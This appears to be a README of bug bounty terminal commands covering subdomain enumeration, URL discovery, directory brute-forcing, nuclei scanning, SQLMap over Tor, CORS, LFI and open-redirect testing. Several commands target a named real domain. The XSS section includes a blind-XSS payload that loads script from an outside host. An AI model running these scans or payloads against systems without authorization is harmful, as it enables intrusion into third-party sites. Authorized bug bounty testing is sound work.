# Bug Bounty Hunting Terminal Commands

This repository contains a collection of terminal commands commonly used for bug bounty hunting.

## Subdomain Enumeration

```bash
# Find subdomains using Subfinder
subfinder -d viator.com -all -recursive > subdomain.txt

# Check for alive subdomains with specific ports
cat subdomain.txt | httpx-toolkit -ports 80,443,8080,8000,8888 -threads 200 > subdomains_alive.txt
```

## URL Discovery

```bash
# Discover URLs with Katana and filter useful file types
katana -u subdomains_alive.txt -d 5 -ps -pss waybackarchive,commoncrawl,alienvault -kf -jc -fx -ef woff,css,png,svg,jpg,woff2,jpeg,gif,svg -o allurls.txt

# Search for specific file types in URLs
cat allurls.txt | grep -E "\.txt|\.log|\.cache|\.secret|\.db|\.backup|\.yml|\.json|\.gz|\.rar|\.zip|\.config"
```

## JavaScript Files

```bash
# Extract JavaScript files and test for exposures
cat allurls.txt | grep -E "\.js$" >> js.txt
cat js.txt | nuclei -t /home/asshu/nuclei-templates/http/exposures/

# Directly scan JavaScript files from domain
echo www.viator.com | katana -ps | grep -E "\.js$" | nuclei -t /home/asshu/nuclei-templates/http/exposures/ -c 30
```

## Directory Bruteforcing

```bash
# Bruteforce common directory names
dirsearch -u https://www.viator.com -e conf,config,bak,backup,swp,old,db,sql,asp,aspx,aspx~,asp~,py,py~,rb,rb~,php,php~,bak,bkp,cache,cgi,conf,csv,html,inc,jar,js,json,jsp,jsp~,lock,log,rar,old,sql,sql.gz,sql~,swp,swp~,tar,tar.bz2,tar.gz,txt,wadl,zip,.log,.xml,.js,.json
```

## XSS Detection

```bash
# Detect XSS vulnerabilities with a payload
subfinder -d viator.com | httpx-toolkit -silent | katana -ps -f qurl | gf xss | bxss -appendMode -payload '"><script src=https://xss.report/c/aswin></script>' -parameters
```

## Subdomain Takeover

```bash
# Run Subzy to detect subdomain takeovers
subzy run --targets subdomains.txt --concurrency 100 --hide_fails --verify_ssl
```

## CORS Misconfiguration

```bash
# Test for CORS misconfiguration
python3 corsy.py -i /home/coffinxp/vaitor/subdomains_alive.txt -t 10 --headers "User-Agent: GoogleBot\nCookie: SESSION=Hacked"
```

## Vulnerability Scanning

```bash
# Run Nuclei templates against subdomains
nuclei -list subdomains_alive.txt -t /home/asshu/nuclei-templates/Priv8-Nuclei-Templates/
nuclei -list ~/vaitor/subdomains_alive.txt -tags cve,osint,tech
```

## Local File Inclusion (LFI) & Open Redirect

```bash
# Test for LFI vulnerabilities
cat allurls.txt | gf lfi | nuclei -tags lfi

# Test for Open Redirect vulnerabilities
cat allurls.txt | gf redirect | openredirex -p /home/coffinxp/openRedirect
```

## API, Development, and Staging Subdomains

```bash
# Filter API, development, and staging subdomains
subfinder -d target.com -silent | dnsprobe -silent | cut -d ' ' -f1  | grep --color 'api\|dev\|stg\|test\|admin\|demo\|stage\|pre\|vpn'
```

## Additional Subdomain Enumeration Techniques

```bash
# BufferOver, Riddler, and Web Archive methods for subdomains
curl -s https://dns.bufferover.run/dns?q=.target.com | jq -r .FDNS_A[] | cut -d',' -f2 | sort -u
curl -s "https://riddler.io/search/exportcsv?q=pld:target.com" | grep -Po "(([\w.-]*)\.([\w]*)\.([A-z]))\w+" | sort -u
curl -s "http://web.archive.org/cdx/search/cdx?url=*.target.com/*&output=text&fl=original&collapse=urlkey" | sed -e 's_https*://__' -e "s/\/.*//" | sort -u
curl -s "https://crt.sh/?q=%25.target.com&output=json" | jq -r '.[].name_value' | sed 's/\*\.//g' | sort -u
```

## SQL Injection Detection

```bash
# SQL Injection testing with SQLMap
sqlmap -r request.txt --time-sec=10 --tor --tor-type=SOCKS5 --check-tor
```

## Port Scanning

```bash
# Port scanning with Naabu
naabu -l targets.txt -rate 3000 -retries 3 -warm-up-time 0 -rate 150 -c 50 -ports 1-65535 -silent -o out.txt
```

## License

This repository is licensed under the MIT License.
